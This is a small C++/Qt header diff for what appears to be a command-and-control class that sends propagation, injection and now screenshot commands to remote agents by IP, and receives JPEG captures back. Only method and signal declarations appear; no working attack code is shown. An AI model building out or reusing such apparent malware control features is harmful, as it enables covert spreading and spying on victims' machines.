@@ -37,6 +37,7 @@ public:
     void disconnectAgent(const QString& ip);
     void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
     void sendInjectCommand(const QString& ip, const QString& targetPath);
+    void sendScreenshotCommand(const QString& ip);
 
     // Getters
     [[nodiscard]] bool     isRunning() const;
@@ -51,6 +52,8 @@ signals:
     void propagationResultReceived(const QString& ip, const QString& result);
     void scanResultReceived(const QString& ip, const QString& report);
     void injectResultReceived(const QString& ip, bool success, const QString& targetPath);
+    void screenshotReceived(const QString& ip, const QByteArray& jpeg,
+                            int width, int height, bool success);
     void statusMessage(const QString& message);
 
 private:
